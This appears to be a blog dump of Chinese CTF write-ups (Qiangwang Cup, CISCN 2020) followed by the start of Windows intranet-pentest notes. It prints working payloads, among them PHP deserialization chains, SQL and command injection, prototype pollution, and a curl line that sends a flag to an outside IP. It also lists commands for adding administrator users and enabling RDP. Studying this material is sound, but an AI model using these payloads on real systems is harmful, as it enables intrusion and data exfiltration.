正常序列化,0x00用0代替： 1234567891011121314151617&lt;?phpclass player&#123; protected $user; protected $pass; protected $admin; public function __construct()&#123; $this-&gt;user = &#x27;test&#x27;; $this-&gt;pass = &#x27;test&#x27;; $this-&gt;admin = 1; &#125;&#125;$a=serialize(new player());echo str_replace(chr(0),&#x27;0&#x27;,$a);// O:6:&quot;player&quot;:3:&#123;s:7:&quot;0*0user&quot;;s:4:&quot;test&quot;;s:7:&quot;0*0pass&quot;;s:4:&quot;test&quot;;s:8:&quot;0*0admin&quot;;i:1;&#125; 访问play.php会反序列化，pop链： 1topsolo::__destruct() &#x3D;&#x3D;&gt; TP() &#x3D;&#x3D;&gt; $name() &#x3D;&#x3D;&gt; midsolo::__invoke() &#x3D;&#x3D;&gt; Gank() &#x3D;&#x3D;&gt; stristr &#x3D;&#x3D;&gt; jungle::__toString() &#x3D;&#x3D;&gt; KS() 构造exp，有两处需要绕过: 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass player&#123; protected $user; protected $pass; protected $admin; public function __construct()&#123; $this-&gt;user = &#x27;test&#x27;; $this-&gt;pass = new topsolo(); $this-&gt;admin = 1; &#125;&#125;class topsolo&#123; protected $name; public function __construct()&#123; $this-&gt;name = new midsolo(); &#125;&#125;class midsolo&#123; protected $name; public function __construct()&#123; $this-&gt;name = new jungle(); &#125;&#125;class jungle&#123; protected $name = &quot;&quot;;&#125;$a=new player();$b=serialize($a);$c=str_replace(&#x27;test&quot;&#x27;,&#x27;&#x27;,stristr($b,&#x27;test&quot;&#x27;));$d=str_replace(&#x27;s:7:&quot;&#x27;.chr(0).&#x27;*&#x27;.chr(0).&#x27;name&quot;&#x27;,&#x27;S:7:&quot;\\00\\2a\\00\\6e\\61\\6d\\65&quot;&#x27;,$c); // 绕过check函数$d=str_replace(&#x27;&quot;midsolo&quot;:1:&#x27;,&#x27;&quot;midsolo&quot;:2:&#x27;,$d); // 绕过__weakupecho urlencode($d); 接着再看需要多少个\\0*\\0，上面序列化之后$pass的长度是三位，所以要吃掉的就是，这里0x00替换成0，长度为22： 1&quot;;s:7:&quot;0*0pass&quot;;s:XXX: 列方程： 15n&#x3D;3n+22+k n=11,k=0刚好可以，因此构造payload: 1?username&#x3D;\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0&amp;password&#x3D;%3Bs%3A7%3A%22%00%2A%00pass%22%3BO%3A7%3A%22topsolo%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A7%3A%22midsolo%22%3A2%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3BO%3A6%3A%22jungle%22%3A1%3A%7BS%3A7%3A%22%5C00%5C2a%5C00%5C6e%5C61%5C6d%5C65%22%3Bs%3A0%3A%22%22%3B%7D%7D%7Ds%3A8%3A%22%00%2A%00admin%22%3Bi%3A1%3B%7D 然后请求play.php即可得到flag banknc连接发现是这样的形式，让我们爆破前三位 1sha256(XXX+rN3KgrFumXZ3gkHew) &#x3D;&#x3D; 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc 直接hashcat掩码爆破 1hashcat64.exe -a 3 -m 1400 9fd1a6531ed24bb86eef93614c0a34bcd64cc0819b976b8e55bd04d5951f7bbc ?a?a?arN3KgrFumXZ3gkHew 测试一遍之后发现代码存在漏洞，直接交易的时候输负数就能增加cash Funhash源码： 1234567891011121314151617181920212223&lt;?phpinclude &#x27;conn.php&#x27;;highlight_file(&quot;index.php&quot;);//level 1if ($_GET[&quot;hash1&quot;] != hash(&quot;md4&quot;, $_GET[&quot;hash1&quot;]))&#123; die(&#x27;level 1 failed&#x27;);&#125;//level 2if($_GET[&#x27;hash2&#x27;] === $_GET[&#x27;hash3&#x27;] || md5($_GET[&#x27;hash2&#x27;]) !== md5($_GET[&#x27;hash3&#x27;]))&#123; die(&#x27;level 2 failed&#x27;);&#125;//level 3$query = &quot;SELECT * FROM flag WHERE password = &#x27;&quot; . md5($_GET[&quot;hash4&quot;],true) . &quot;&#x27;&quot;;$result = $mysqli-&gt;query($query);$row = $result-&gt;fetch_assoc(); var_dump($row);$result-&gt;free();$mysqli-&gt;close();?&gt; 第一关找0e+纯数字md4加密后还是0e+纯数字的字符串就行，脚本： 1234567891011121314151617181920from concurrent.futures import ThreadPoolExecutorimport threading,timeimport hashlibdef md4(s): obj = hashlib.new(&quot;md4&quot;) obj.update(s.encode()) return obj.hexdigest()def check(id): #print(id) enc=md4(&#x27;0e&#x27;+str(id)) if enc[0:2]==&#x27;0e&#x27; and enc[2:-1].isdigit(): print(&#x27;0e&#x27;+str(id)) return 1 return 0if __name__ == &quot;__main__&quot;: thread_pool = ThreadPoolExecutor(100) for i in range(1,1000000000): thread_pool.submit(check,i) 第二关数组绕过,第三关和javisoj上的Login一样，找到一个字符串MD5加密后得到的原始二进制格式在SQL中拼接成 类似 &#39;or&#39;xxx的形式就可以绕过了 payload: 1?hash1&#x3D;0e251288019&amp;hash2[]&#x3D;1&amp;hash3[]&#x3D;&amp;hash4&#x3D;ffifdyop uploadwireshark打开 导出http对象，发现steghide.php，foremost分离一张图片，steghide隐写，密码弱口令123456 主动就过滤了flag，用*绕过 payload: 1?ip&#x3D;127.0.0.1||cat * 查看源码得到flag","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"},{"name":"强网杯","slug":"强网杯","permalink":"http://www.moonback.xyz/tags/%E5%BC%BA%E7%BD%91%E6%9D%AF/"}]},{"title":"国赛CISCN2020初赛-wp","slug":"国赛2020初赛-wp","date":"2020-08-25T14:08:04.000Z","updated":"2020-09-06T14:46:01.859Z","comments":true,"path":"2020/08/25/国赛2020初赛-wp/","link":"","permalink":"http://www.moonback.xyz/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/","excerpt":"学长带我们打了打😀","text":"学长带我们打了打😀 Webeasyphp源码： 1234567891011121314151617&lt;?php //题目环境：php:7.4.8-apache $pid = pcntl_fork(); if ($pid == -1) &#123; die(&#x27;could not fork&#x27;); &#125;else if ($pid)&#123; $r=pcntl_wait($status); if(!pcntl_wifexited($status))&#123; phpinfo(); &#125; &#125;else&#123; highlight_file(__FILE__); if(isset($_GET[&#x27;a&#x27;])&amp;&amp;is_string($_GET[&#x27;a&#x27;])&amp;&amp;!preg_match(&quot;/[:\\\\\\\\]|exec|pcntl/i&quot;,$_GET[&#x27;a&#x27;]))&#123; call_user_func_array($_GET[&#x27;a&#x27;],[$_GET[&#x27;b&#x27;],false,true]); &#125; posix_kill(posix_getpid(), SIGUSR1); &#125; 参考文章： 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;raoxiaoya&#x2F;article&#x2F;details&#x2F;106604519 可以知道只有让挂起的子进程退出才能执行phpinfo() 1call_user_func_array($_GET[&#x27;a&#x27;],[$_GET[&#x27;b&#x27;],false,true]); call_user_func_array会调用回调函数，并把一个数组参数作为回调函数的参数 因此我们需要让$_GET[&#39;a&#39;]表示的函数能够接收三个参数，并且$_GET[&#39;b&#39;]表示的函数能够接收两个参数，用pcntl_wait和pcntl_waitpid让子进程退出 尝试构造payload： 1234?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_wait?a&#x3D;register_shutdown_function&amp;b&#x3D;pcntl_waitpid?a&#x3D;call_user_func&amp;b&#x3D;pcntl_wait?a&#x3D;call_user_func&amp;b&#x3D;pcntl_waitpid flag在phpinfo中，CTRL+F搜索flag rceme源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283&lt;?phperror_reporting(0);highlight_file(__FILE__);parserIfLabel($_GET[&#x27;a&#x27;]);function danger_key($s) &#123; $s=htmlspecialchars($s); $key=array(&#x27;php&#x27;,&#x27;preg&#x27;,&#x27;server&#x27;,&#x27;chr&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;request&#x27;,&#x27;file&#x27;,&#x27;cookie&#x27;,&#x27;session&#x27;,&#x27;sql&#x27;,&#x27;mkdir&#x27;,&#x27;copy&#x27;,&#x27;fwrite&#x27;,&#x27;del&#x27;,&#x27;encrypt&#x27;,&#x27;$&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell&#x27;,&#x27;open&#x27;,&#x27;ini_&#x27;,&#x27;chroot&#x27;,&#x27;eval&#x27;,&#x27;passthru&#x27;,&#x27;include&#x27;,&#x27;require&#x27;,&#x27;assert&#x27;,&#x27;union&#x27;,&#x27;create&#x27;,&#x27;func&#x27;,&#x27;symlink&#x27;,&#x27;sleep&#x27;,&#x27;ord&#x27;,&#x27;str&#x27;,&#x27;source&#x27;,&#x27;rev&#x27;,&#x27;base_convert&#x27;); $s = str_ireplace($key,&quot;*&quot;,$s); $danger=array(&#x27;php&#x27;,&#x27;preg&#x27;,&#x27;server&#x27;,&#x27;chr&#x27;,&#x27;decode&#x27;,&#x27;html&#x27;,&#x27;md5&#x27;,&#x27;post&#x27;,&#x27;get&#x27;,&#x27;request&#x27;,&#x27;file&#x27;,&#x27;cookie&#x27;,&#x27;session&#x27;,&#x27;sql&#x27;,&#x27;mkdir&#x27;,&#x27;copy&#x27;,&#x27;fwrite&#x27;,&#x27;del&#x27;,&#x27;encrypt&#x27;,&#x27;$&#x27;,&#x27;system&#x27;,&#x27;exec&#x27;,&#x27;shell&#x27;,&#x27;open&#x27;,&#x27;ini_&#x27;,&#x27;chroot&#x27;,&#x27;eval&#x27;,&#x27;passthru&#x27;,&#x27;include&#x27;,&#x27;require&#x27;,&#x27;assert&#x27;,&#x27;union&#x27;,&#x27;create&#x27;,&#x27;func&#x27;,&#x27;symlink&#x27;,&#x27;sleep&#x27;,&#x27;ord&#x27;,&#x27;str&#x27;,&#x27;source&#x27;,&#x27;rev&#x27;,&#x27;base_convert&#x27;); foreach ($danger as $val)&#123; if(strpos($s,$val) !==false)&#123; die(&#x27;很抱歉，执行出错，发现危险字符【&#x27;.$val.&#x27;】&#x27;); &#125; &#125; if(preg_match(&quot;/^[a-z]$/i&quot;))&#123; die(&#x27;很抱歉，执行出错，发现危险字符&#x27;); &#125; return $s;&#125;function parserIfLabel( $content ) &#123; $pattern = &#x27;/\\&#123;if:([\\s\\S]+?)&#125;([\\s\\S]*?)&#123;end\\s+if&#125;/&#x27;; if ( preg_match_all( $pattern, $content, $matches ) ) &#123; $count = count( $matches[ 0 ] ); for ( $i = 0; $i &lt; $count; $i++ ) &#123; $flag = &#x27;&#x27;; $out_html = &#x27;&#x27;; $ifstr = $matches[ 1 ][ $i ]; $ifstr=danger_key($ifstr,1); if(strpos($ifstr,&#x27;=&#x27;) !== false)&#123; $arr= splits($ifstr,&#x27;=&#x27;); if($arr[0]==&#x27;&#x27; || $arr[1]==&#x27;&#x27;)&#123; die(&#x27;很抱歉，模板中有错误的判断,请修正【&#x27;.$ifstr.&#x27;】&#x27;); &#125; $ifstr = str_replace( &#x27;=&#x27;, &#x27;==&#x27;, $ifstr ); &#125; $ifstr = str_replace( &#x27;&lt;&gt;&#x27;, &#x27;!=&#x27;, $ifstr ); $ifstr = str_replace( &#x27;or&#x27;, &#x27;||&#x27;, $ifstr ); $ifstr = str_replace( &#x27;and&#x27;, &#x27;&amp;&amp;&#x27;, $ifstr ); $ifstr = str_replace( &#x27;mod&#x27;, &#x27;%&#x27;, $ifstr ); $ifstr = str_replace( &#x27;not&#x27;, &#x27;!&#x27;, $ifstr ); if ( preg_match( &#x27;/\\&#123;|&#125;/&#x27;, $ifstr)) &#123; die(&#x27;很抱歉，模板中有错误的判断,请修正&#x27;.$ifstr); &#125;else&#123; @eval( &#x27;if(&#x27; . $ifstr . &#x27;)&#123;$flag=&quot;if&quot;;&#125;else&#123;$flag=&quot;else&quot;;&#125;&#x27; ); &#125; if ( preg_match( &#x27;/([\\s\\S]*)?\\&#123;else\\&#125;([\\s\\S]*)?/&#x27;, $matches[ 2 ][ $i ], $matches2 ) ) &#123; switch ( $flag ) &#123; case &#x27;if&#x27;: if ( isset( $matches2[ 1 ] ) ) &#123; $out_html .= $matches2[ 1 ]; &#125; break; case &#x27;else&#x27;: if ( isset( $matches2[ 2 ] ) ) &#123; $out_html .= $matches2[ 2 ]; &#125; break; &#125; &#125; elseif ( $flag == &#x27;if&#x27; ) &#123; $out_html .= $matches[ 2 ][ $i ]; &#125; $pattern2 = &#x27;/\\&#123;if([0-9]):/&#x27;; if ( preg_match( $pattern2, $out_html, $matches3 ) ) &#123; $out_html = str_replace( &#x27;&#123;if&#x27; . $matches3[ 1 ], &#x27;&#123;if&#x27;, $out_html ); $out_html = str_replace( &#x27;&#123;else&#x27; . $matches3[ 1 ] . &#x27;&#125;&#x27;, &#x27;&#123;else&#125;&#x27;, $out_html ); $out_html = str_replace( &#x27;&#123;end if&#x27; . $matches3[ 1 ] . &#x27;&#125;&#x27;, &#x27;&#123;end if&#125;&#x27;, $out_html ); $out_html = $this-&gt;parserIfLabel( $out_html ); &#125; $content = str_replace( $matches[ 0 ][ $i ], $out_html, $content ); &#125; &#125; return $content;&#125;function splits( $s, $str=&#x27;,&#x27; ) &#123; if ( empty( $s ) ) return array( &#x27;&#x27; ); if ( strpos( $s, $str ) !== false ) &#123; return explode( $str, $s ); &#125; else &#123; return array( $s ); &#125;&#125; 题目改自zzzphp rce，参考文章： 1https:&#x2F;&#x2F;y4er.com&#x2F;post&#x2F;zzzphp-rce&#x2F; 发现过滤了str，因此作者的那种方法用不了了，直接反引号命令执行，用curl外带出flag，构造payload: 1?a&#x3D;&#123;if:1)&#96;curl 47.97.210.141:9000&#x2F;\\&#96;cat &#x2F;fl*\\&#96;&#96;;&#x2F;&#x2F;&#125;&#123;end if&#125; 服务端用nc监听即可得到flag littlegame看了看主要代码，发现得到flag的条件 12345let key = req.body.key.toString();let password = req.body.password.toString();if(Admin[key] === password)&#123; res.send(process.env.flag);&#125; 并且key和password是可控的，接着发现setFn这个敏感函数： 123let key = req.body.NewAttributeKey.toString();let value = req.body.NewAttributeValue.toString();setFn(req.session.knight, key, value); 发现是引入set-value这个包得到的： 1const setFn = require(&#x27;set-value&#x27;); 搜了下，搜到了这篇文章： 1https:&#x2F;&#x2F;snyk.io&#x2F;vuln&#x2F;SNYK-JS-SETVALUE-450213 js原型链污染，为所有对象增加aaa属性 12345678910111213141516POST &#x2F;Privilege HTTP&#x2F;1.1Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaYUpgrade-Insecure-Requests: 1If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMTIf-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;Cache-Control: max-age&#x3D;0Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 51NewAttributeKey&#x3D;__proto__.aaa&amp;NewAttributeValue&#x3D;aaa 用污染的键值得到flag 12345678910111213141516POST &#x2F;DeveloperControlPanel HTTP&#x2F;1.1Host: eci-2zefq4smu48613r6o17l.cloudeci1.ichunqiu.com:8888User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko&#x2F;20100101 Firefox&#x2F;79.0Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateConnection: closeCookie: __jsluid_h&#x3D;93637ceba89c6fddd5299faa318a6cea; session&#x3D;s%3A7wfZ0-VLrHUCedTzvR8lbsdb9yZkkEZH.8uPhesdOIoUUYn73e63GfvympMqk%2FiBm3cJ6avzlyaYUpgrade-Insecure-Requests: 1If-Modified-Since: Thu, 20 Aug 2020 08:01:33 GMTIf-None-Match: W&#x2F;&quot;1cb-1740ae32748&quot;Cache-Control: max-age&#x3D;0Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 20key&#x3D;aaa&amp;password&#x3D;aaa easytrick源码： 12345678910111213141516&lt;?phpclass trick&#123; public $trick1; public $trick2; public function __destruct()&#123; $this-&gt;trick1 = (string)$this-&gt;trick1; if(strlen($this-&gt;trick1) &gt; 5 || strlen($this-&gt;trick2) &gt; 5)&#123; die(&quot;你太长了&quot;); &#125; if($this-&gt;trick1 !== $this-&gt;trick2 &amp;&amp; md5($this-&gt;trick1) === md5($this-&gt;trick2) &amp;&amp; $this-&gt;trick1 != $this-&gt;trick2)&#123; echo file_get_contents(&quot;/flag&quot;); &#125; &#125;&#125;highlight_file(__FILE__);unserialize($_GET[&#x27;trick&#x27;]); 可以用NAN和INF绕过，如图： 构造poc： 123456789&lt;?phpclass trick&#123; public $trick1; public $trick2;&#125; $a=new trick();$a-&gt;trick1=&#x27;NAN&#x27;;$a-&gt;trick2=NAN;echo serialize($a); Misc签到等到各个地区助力完成后就会给出flag the_best_ctf_gamehxd打开可以明显看到flag字样 并且中间隔的都是 100 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 0C 00 00 00 E0 FF FF FF B0 FF FF FF 00 00 00 00 直接全局替换成空得到flag 电脑被黑binwalk分离出 demo用ida64打开得到 12345678910111213141516171819202122232425262728293031323334353637383940414243int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax char v4; // [rsp+1Dh] [rbp-13h] char v5; // [rsp+1Eh] [rbp-12h] char v6; // [rsp+1Fh] [rbp-11h] FILE *v7; // [rsp+20h] [rbp-10h] FILE *stream; // [rsp+28h] [rbp-8h] v4 = 34; v5 = 0; v7 = fopen(argv[1], &quot;rb&quot;); if ( v7 ) &#123; stream = fopen(argv[1], &quot;rb+&quot;); if ( stream ) &#123; while ( 1 ) &#123; v6 = fgetc(v7); if ( v6 == -1 ) break; fputc(v4 ^ (v5 + v6), stream); v4 += 34; v5 = (v5 + 2) &amp; 0xF; &#125; fclose(v7); fclose(stream); result = 0; &#125; else &#123; printf(&quot;cannot open file&quot;, &quot;rb+&quot;, argv); result = 0; &#125; &#125; else &#123; printf(&quot;cannot open this file&quot;, &quot;rb&quot;, argv); result = 0; &#125; return result;&#125; 题目提示误删数据，用extundelete恢复删除的数据得到flag.txt 逆一下算法，exp： 1234567891011121314v4=34v5=0v7=open(&quot;flag.txt&quot;,&quot;rb&quot;).read()for v6 in v7: with open(&quot;trueflag.txt&quot;,&quot;ab+&quot;) as fp: # print(str(v6)) a=((int(str(v6))^v4)-v5)%256 if a==-1: v4=34 v5=0 continue print(chr(a),end=&quot;&quot;) v4+=34; v5=(v5+2) &amp; 0xf CryptobdRSA中的维纳攻击，脚本地址： 1https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack 通过维纳攻击计算出d，然后解密就行，脚本： 12345678910111213141516171819202122232425262728293031323334import ContinuedFractions, Arithmetic, RSAvulnerableKeyGeneratorfrom binascii import a2b_hexdef hack_RSA(e,n): &#x27;&#x27;&#x27; Finds d knowing (e,n) applying the Wiener continued fraction attack &#x27;&#x27;&#x27; frac = ContinuedFractions.rational_to_contfrac(e, n) convergents = ContinuedFractions.convergents_from_contfrac(frac) for (k,d) in convergents: #check if d is actually the key if k!=0 and (e*d-1)%k == 0: phi = (e*d-1)//k s = n - phi + 1 # check if the equation x^2 - s*x + n = 0 # has integer roots discr = s*s - 4*n if(discr&gt;=0): t = Arithmetic.is_perfect_square(discr) if t!=-1 and (s+t)%2==0: print(&quot;Hacked!&quot;) return d c=37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066e=46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249N=86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289d=hack_RSA(e,N)m=pow(c,d,N)flag=a2b_hex(hex(m).replace(&#x27;0x&#x27;,&#x27;&#x27;)).decode()print(flag)","categories":[],"tags":[{"name":"writeup","slug":"writeup","permalink":"http://www.moonback.xyz/tags/writeup/"}]},{"title":"内网渗透初探之Windows基础","slug":"内网渗透1","date":"2020-06-24T14:41:15.000Z","updated":"2020-09-16T10:09:53.249Z","comments":true,"path":"2020/06/24/内网渗透1/","link":"","permalink":"http://www.moonback.xyz/2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/","excerpt":"记一下，忘了方便看！！！","text":"记一下，忘了方便看！！！ Windows用户和用户组常见用户Administrator系统管理员，计算机的管理员账户拥有对全系统的控制权，能改变系统设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。Windows7中至少要有一个计算机管理员账户。在只有一个计算机管理员账户的情况下，该账户不能将自己改成受限制账户。 User标准用户账户是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。 SystemSYSTEM是系统保留拥有最高权限的超级管理员帐户。默认情况下，我们无法直接在登录对话框上以SYSTEM帐户的身份登录到Windows桌面环境。 用户组基本用户组Administrators 属于该administators本地组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执行整台计算机的管理任务。内置的系统管理员账号Administrator就是本地组的成员，而且无法将它从该组删除。 如果这台计算机已加入域，则域的Domain Admins会自动地加入到该计算机的Administrators组内。也就是说，域上的系统管理员在这台计算机上也具备着系统管理员的权限。 Backup OPerators 在该组内的成员，不论它们是否有权访问这台计算机中的文件夹或文件，都可以通过“开始”－“所有程序”－“附件”－“系统工具”－“备份”的途径，备份与还原这些文件夹与文件。 Guests 该组是提供没有用户帐户，但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。 Network Configuration Operators 该组内的用户可以在客户端执行一般的网络设置任务，例如更改IP地址，但是不可以安装/删除驱动程序与服务，也不可以执行与网络服务器设置有关的任务，例如DNS服务器、DHCP服务器的设置。 Power Users 该组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少一些，例如，可以： 创建、删除、更改本地用户帐户 创建、删除、管理本地计算机内的共享文件夹与共享打印机 自定义系统设置，例如更改计算机时间、关闭计算机等 但是不可以更改Administrators与Backup Operators、无法夺取文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日志。 Remote Desktop Users 该组的成员可以通过远程计算机登录，例如，利用终端服务器从远程计算机登录。 Users 该组员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能更改其它用户的数据、不能关闭服务器级的计算机。 所有添加的本地用户帐户者自动属于该组。如果这台计算机已经加入域，则域的Domain Users会自动地被加入到该计算机的Users组中。 SYSTEM ​ 拥有和Administrators一样、甚至比其还高的权限，但是这个组不允许任何用户的加入，在察看用户组的时候，它也不会被显示出来，它就是SYSTEM组。系统和系统级的服务正常运行所需要的权限都是靠它赋予的。由于该组只有这一个用户SYSTEM，可以理解成linux的root用户 内置特殊组Everone 任何一个用户都属于这个组。注意，如果Guest帐号被启用时，则给Everone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everone组，所以他将具备Everyone所拥有的权限。 Authenticated Users 任何一个利用有效的用户帐户连接的用户都属于这个组。建议在设置权限时，尽量针对Authenticated Users组进行设置，而不要针对Everone进行设置。 Interactive 任何在本地登录的用户都属于这个组。 Network 任何通过网络连接此计算机的用户都属于这个组。 Creator Owner 文件夹、文件或打印文件等资源的创建者，就是该资源的Creator Owner（创建所有者）。不过，如果创建者是属于Administrators组内的成员，则其Creator Owner为Administrators组。 Anonymous Logon 任何未利用有效的Windows Server 2003帐户连接的用户，都属于这个组。注意，在windows 2003内，Everone 组内并不包含“Anonymous Logon”组 SID概念SID也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。 作用用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。 访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，重新获取访问令牌。 组成如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。 一个完整的SID包括： 用户和组的安全描述 48-bit的ID authority 修订版本 可变的验证值Variable sub-authority values 例：S-1-5-21-310440588-250036847-580389505-500 我们来先分析这个重要的SID。第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。 SID的获得开始－运行－regedt32－HKEY_LOCAL_MACHINE\\SAM\\SAM\\Domains\\Builtin\\Aliases\\Members，找到本地的域的代码，展开后，得到的就是本地帐号的所有SID列表。 其中很多值都是固定的，比如第一个000001F4（16进制），换算成十进制是500，说明是系统建立的内置管理员帐号administrator，000001F5换算成10进制是501，也就是GUEST帐号了，详细的参照后面的列表。 这一项默认是system可以完全控制，这也就是为什么要获得这个需要一个System的Cmd的Shell的原因了，当然如果权限足够的话你可以把你要添加的帐号添加进去。 或者使用Support Tools的Reg工具： 1reg query &quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList 还有一种方法可以获得SID和用户名称的对应关系： Regedt32:HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion \\ProfileList 这个时候可以在左侧的窗口看到SID的值，可以在右侧的窗口中ProfileImagePath看到不同的SID关联的用户名，比如%SystemDrive%\\Documents and Settings\\Administrator.momo这个对应的就是本地机器的管理员SID%SystemDrive%\\Documents and Settings\\Administrator.domain这个就是对应域的管理员的帐户 另外微软的ResourceKit里面也提供了工具getsid，sysinternals的工具包里面也有Psgetsid，其实感觉原理都是读取注册表的值罢了，就是省了一些事情。 常用命令12345678910111213141516171819202122232425262728net user # 查看用户net user Administrator # 查看administrator用户详细信息net user moonback 1314 /add # 添加用户名moonback密码为1314的用户，需要管理员权限(注意密码复杂度)net user moonback /delete # 删除moonback用户net user moonback /active:no # 禁用moonback用户net user moonback /active:yes # 启用moonback用户net user moonback /passwordchg:yes # 用户moonback可以改变密码net user moonback /passwordreq:yes # 用户moonback必须拥有密码net user moonback /expires:never # 用户moonback永不过期net localgroup # 查看用户组net localgroup Administrators # 查看管理员组成员net localgroup Administrators moonback /del # 将moonback用户从管理员组删除net localgroup Administrators moonback /add # 将moonback用户添加到管理员组net localgroup hack /add # 添加hack用户组whoami /user # 查看SIDquery user # 查看在线用户tasklist # 查看进程tasklist /svc # 查看进程及对应的pid和服务tasklist /svc | findstr &quot;TeamService.exe&quot; # 查看远程桌面进程taskkill /f /im pid # 强制杀死pid号进程netstat -ano # 显示网络信息netstat -ano | findstr &quot;3389&quot; # 查看3389端口状态REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f # 开启3389REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f # 关闭3389REG query HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server\\WinStations\\RDP-Tcp /v PortNumber # 查看远程桌面端口ver # 查看系统版本，5.1=&gt;2003 5.2=&gt;xp 6.1=&gt;win7、2008 6.2=&gt;win8、2012 10=&gt;win10systeminfo # 查看windows详细信息 Windows认证及密码Windows防护方案UACWindows Vista 开始引入了 UAC(User Account Control，用户账户控制)，最直观的表现是当应用试图安装软件或更改计算机、或者更改了 Windows 设置时将弹出 UAC 提示框。 从 Windows 